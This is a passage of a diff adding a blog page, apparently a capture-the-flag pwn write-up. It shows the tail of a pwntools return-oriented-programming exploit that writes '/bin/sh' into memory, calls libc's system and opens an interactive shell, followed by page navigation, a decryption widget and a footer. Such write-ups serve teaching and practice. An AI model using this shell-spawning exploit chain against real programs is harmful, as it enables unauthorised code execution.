+</span><span style="color:#bf616a;">LIBC_POP_RBX </span><span>= </span><span style="color:#d08770;">0x83e21
+</span><span style="color:#bf616a;">SYSTEM </span><span>= </span><span style="color:#d08770;">0x58750
+</span><span>
+</span><span>writeable = </span><span style="color:#d08770;">0x404500
+</span><span>
+</span><span>payload = </span><span style="color:#bf616a;">flat</span><span>({
+</span><span>    </span><span style="color:#d08770;">0x28</span><span>: [
+</span><span>        </span><span style="color:#bf616a;">POP_RCX</span><span>,
+</span><span>        </span><span style="color:#d08770;">0x404011</span><span>,
+</span><span>        </span><span style="color:#bf616a;">POP_RBP</span><span>,
+</span><span>        writeable,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx, </span><span style="color:#65737e;"># al=c3
+</span><span>        ADD_BPRCX_AL_poprbp,
+</span><span>        writeable,
+</span><span>        </span><span style="color:#bf616a;">POP_RCX</span><span>,
+</span><span>        </span><span style="color:#d08770;">0x404010</span><span>,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_EAX_0x2ec3_addrbp0x3debx,
+</span><span>        ADD_BPRCX_AL_poprbp, writeable,
+</span><span>        ADD_BPRCX_AL_poprbp, writeable,
+</span><span>        ADD_BPRCX_AL_poprbp, writeable,
+</span><span>        ADD_BPRCX_AL_poprbp, writeable,
+</span><span>        ADD_BPRCX_AL_poprbp, writeable,
+</span><span>        ADD_BPRCX_AL_poprbp, writeable,
+</span><span>        ADD_BPRCX_AL_poprbp, writeable,
+</span><span>        ADD_BPRCX_AL_poprbp, writeable,
+</span><span>        ADD_BPRCX_AL_poprbp, writeable,
+</span><span>        </span><span style="color:#bf616a;">PRINT_CALL</span><span>,
+</span><span>        </span><span style="color:#d08770;">0</span><span>,
+</span><span>        </span><span style="color:#d08770;">0</span><span>,
+</span><span>        </span><span style="color:#bf616a;">SYSTEM</span><span>-</span><span style="color:#bf616a;">LIBC_POP_RBX</span><span>, </span><span style="color:#65737e;"># new rbx
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r12
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r13
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r14
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r15
+</span><span>        </span><span style="color:#d08770;">0x404010</span><span>+</span><span style="color:#d08770;">0x3d</span><span>, </span><span style="color:#65737e;"># new rbp
+</span><span>        </span><span style="color:#bf616a;">PRINT_CALL</span><span>, </span><span style="color:#65737e;"># rerun for rax=r14=0
+</span><span>        </span><span style="color:#d08770;">0</span><span>,
+</span><span>        </span><span style="color:#d08770;">0</span><span>,
+</span><span>        </span><span style="color:#bf616a;">SYSTEM</span><span>-</span><span style="color:#bf616a;">LIBC_POP_RBX</span><span>, </span><span style="color:#65737e;"># new rbx
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r12
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r13
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r14
+</span><span>        </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#65737e;"># new r15
+</span><span>        </span><span style="color:#d08770;">0x404010</span><span>+</span><span style="color:#d08770;">0x3d</span><span>, </span><span style="color:#65737e;"># new rbp
+</span><span>        ADD_RPBs0x3d_EBX,
+</span><span>        </span><span style="color:#bf616a;">ADD_RSP_8</span><span>, </span><span style="color:#65737e;"># skip over /bin/sh
+</span><span>        </span><span style="color:#d08770;">0x0068732f6e69622f</span><span>, </span><span style="color:#65737e;"># /bin/sh\0
+</span><span>        </span><span style="color:#bf616a;">RET</span><span>,
+</span><span>        </span><span style="color:#bf616a;">RET</span><span>,
+</span><span>        MOV_RBP_RSP_poprcx,
+</span><span>        </span><span style="color:#d08770;">0</span><span>,
+</span><span>        </span><span style="color:#bf616a;">PRINT_CALL
+</span><span>        ]
+</span><span>    })
+</span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#96b5b4;">len</span><span>(payload))
+</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>
+</span><span>io.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span></code></pre>
+</section>
+  <hr />
+  <!-- Post Taxonomies -->
+
+  <!-- Post Nav -->
+<nav class="block-bg mt-12 flex flex-wrap rounded-lg text-lg">
+  <a
+    class="block-hover-mask flex min-w-[50%] grow items-center rounded-l-md p-6 pr-3 font-semibold no-underline"
+    href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-voleur/" accesskey=","
+    ><span class="mr-1.5">&#8249;</span><span>HackTheBox Voleur Writeup</span></a>
+  <a
+    class="block-hover-mask ml-auto flex min-w-[50%] grow items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline"
+    href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/" accesskey="."
+    ><span>HackTheBox Cypher Writeup</span><span class="ml-1.5">&#8250;</span></a>
+</nav>
+
+  <!-- Begin Page End inject -->
+  
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script>
+<script>
+  mediumZoom('img:not(.no-zoom)', {
+    margin: 24,
+    background: 'rgba(0, 0, 0, 0.9)',
+    scrollOffset: 40,
+  });
+</script>
+<!-- Only runs if .encrypted-content exists -->
+<script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    function showDecryptionUI(block) {
+      block.innerHTML = `<div style="padding: 1rem; border: 1px solid #444; border-radius: 8px; background: #1e1e1e;">
+  <label style="display:block; margin-bottom:0.8rem; font-weight:600; font-size:1.1rem; color:#f5f5f5;">
+    🔒 This content is password-protected:
+  </label>
+  <div style="display: flex; align-items: center; gap: 0.75rem;">
+    <input type="password" id="decrypt-password" placeholder="Enter password"
+           style="flex: 1; padding: 0.6rem 0.8rem; font-size: 1rem; background: #2a2a2a; color: #eee; border: 1px solid #555; border-radius: 4px;">
+    <button id="decrypt-button"
+            style="padding: 0.6rem 1rem; background: #2d2d2d; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">
+      Decrypt
+    </button>
+    <div style="display: flex; align-items: center;">
+      <input type="checkbox" id="show-pw" style="margin-left: 0.4rem; cursor: pointer;">
+      <label for="show-pw" title="Show password" style="margin-left: 0.4rem; font-size: 1.2rem; cursor: pointer;">👁️</label>
+    </div>
+  </div>
+  <div id="decrypt-error" style="color: #ff6b6b; margin-top: 0.75rem;"></div>
+</div>
+`;
+      var input = block.querySelector('input[type="password"]');
+      var button = block.querySelector('button');
+      var error = block.querySelector('#decrypt-error');
+      var showPw = block.querySelector('#show-pw');
+      showPw.onchange = function () {
+        input.type = this.checked ? 'text' : 'password';
+      };
+      button.onclick = function () {
+        var password = input.value;
+        var ciphertext_b64 = block.getAttribute('data-encrypted');
+        try {
+          var ciphertext = CryptoJS.enc.Base64.parse(ciphertext_b64);
+          var iv = CryptoJS.lib.WordArray.create(ciphertext.words.slice(0, 4), 16);
+          var actualCiphertext = CryptoJS.lib.WordArray.create(ciphertext.words.slice(4), ciphertext.sigBytes - 16);
+          var key = CryptoJS.SHA256(password);
+          var bytes = CryptoJS.AES.decrypt({ ciphertext: actualCiphertext }, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 });
+          var plaintext = bytes.toString(CryptoJS.enc.Utf8);
+          if (!plaintext) throw new Error('Incorrect password or corrupt data');
+
+          plaintext = plaintext.replace(/!\[\[(.*?)\]\]/g, (match, p1) => {
+            const src = p1.match(/^\//) ? p1 : '/assets/images/' + p1;
+            return `![](${src})`;
+          });
+          plaintext = plaintext.replace(/\[\[(.*?)\]\]/g, (match, p1) => {
+            const href = '/' + p1.trim().replace(/\s+/g, '-').toLowerCase();
+            return `[${p1}](${href})`;
+          });
+          plaintext = plaintext.replace(/!\[\]\((data:image\/[^)]+)\)/g, (match, dataUri) => {
+            return `<img src="${dataUri}" style="max-width:100%; border-radius:8px; margin:1rem 0;">`;
+          });
+
+          if (window.marked) {
+            block.innerHTML = '<div class="post-content">' + marked.parse(plaintext) + '</div>';
+          } else {
+            block.innerHTML = '<pre>' + plaintext + '</pre>';
+            return;
+          }
+          
+          mediumZoom('img:not(.no-zoom)', {
+          margin: 24,
+          background: 'rgba(0, 0, 0, 0.9)',
+          scrollOffset: 40,
+          });
+
+          // ▼▼▼ Inject TOC based on headings ▼▼▼
+          const tocContainer = document.createElement('nav');
+          tocContainer.className = 'toc';
+          const headers = block.querySelectorAll('.post-content h1, .post-content h2, .post-content h3');
+          if (headers.length > 0) {
+            const tocList = document.createElement('ul');
+            headers.forEach(h => {
+              if (!h.id) {
+                h.id = h.textContent.trim().toLowerCase().replace(/\s+/g, '-');
+              }
+              const li = document.createElement('li');
+              li.style.marginLeft = h.tagName === 'H3' ? '1.2em' : h.tagName === 'H2' ? '0.6em' : '0';
+              const a = document.createElement('a');
+              a.href = '#' + h.id;
+              a.textContent = h.textContent;
+              li.appendChild(a);
+              tocList.appendChild(li);
+            });
+            tocContainer.innerHTML = `<strong style="display:block;margin-bottom:0.5em;">▼ Table of Contents</strong>`;
+            tocContainer.appendChild(tocList);
+            block.prepend(tocContainer);
+          }
+          // ▲▲▲ TOC Injection End ▲▲▲
+
+        } catch (e) {
+          let msg = e.message?.match(/utf-?8/i) ? 'Decryption failed' : '❌ ' + (e.message || 'Incorrect password or corrupt data');
+          error.textContent = msg;
+          error.style.display = 'block';
+        }
+      };
+    }
+
+    document.querySelectorAll('.encrypted-content').forEach(showDecryptionUI);
+  });
+</script>
+
+<!-- Share page -->
+<br>
+<div class="robots-nocontent social-share-buttons">
+  <b>Share this content</b>
+  <br>
+  <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+    <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+    <a class="a2a_button_x"></a>
+    <a class="a2a_button_linkedin"></a>
+    <a class="a2a_button_telegram"></a>
+    <a class="a2a_button_mastodon"></a>
+    <a class="a2a_button_email"></a>
+    <a class="a2a_button_microsoft_teams"></a>
+    <a class="a2a_button_threads"></a>
+    <a class="a2a_button_bluesky"></a>
+    <a class="a2a_button_whatsapp"></a>
+  </div>
+  <br>
+  <script async src="https://static.addtoany.com/menu/page.js"></script>
+</div>
+
+
+  <!-- End Page End inject -->
+</article>
+
+  </main>
+  <!-- Footer -->
+<footer class="mx-auto flex lg:mt-5 max-w-3xl flex-wrap items-center px-4 py-3 text-sm opacity-60">
+  <div class="mr-auto basis-full lg:basis-1/2">
+  <a href="https://creativecommons.org/licenses/by-sa/4.0/deed">© <time datetime="2017">2017</time> - <time datetime="2025">2025</time></a>
+  </div>
+  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
+    <span class="mr-6 lg:ml-6">
+      <a class="link" href="https://www.getzola.org/" target="_blank">Powered by Zola</a>
+    </span>
+    <a class="link" href="https://www.getzola.org/themes/linkita/" target="_blank">&#9998; Linkita</a>
+  </div>
+  <!-- Begin Footer inject -->
+  
+  <!-- End Footer inject -->
+</footer>
+
+  
+
+  <!-- Begin Body End inject -->
+  
+  <!-- End Body End inject -->
+</body>
+
+</html>
